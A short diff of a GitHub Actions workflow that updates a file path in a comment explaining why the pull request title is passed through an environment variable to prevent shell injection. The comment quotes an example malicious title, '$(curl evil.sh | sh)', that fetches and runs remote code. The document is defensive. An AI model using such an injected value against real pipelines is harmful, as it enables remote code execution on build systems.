@@ -38,7 +38,7 @@ jobs:
           # `${{ github.event.pull_request.title }}` written inline would be
           # pasted into the shell before bash ever sees it, and a title reading
           # $(curl evil.sh | sh) would then run. This is the same class of bug
-          # the security review found in scripts/write-api-url.mjs.
+          # the security review found in apps/web/scripts/write-api-url.mjs.
           PR_TITLE: ${{ github.event.pull_request.title }}
           PR_NUMBER: ${{ github.event.pull_request.number }}
           PR_URL: ${{ github.event.pull_request.html_url }}
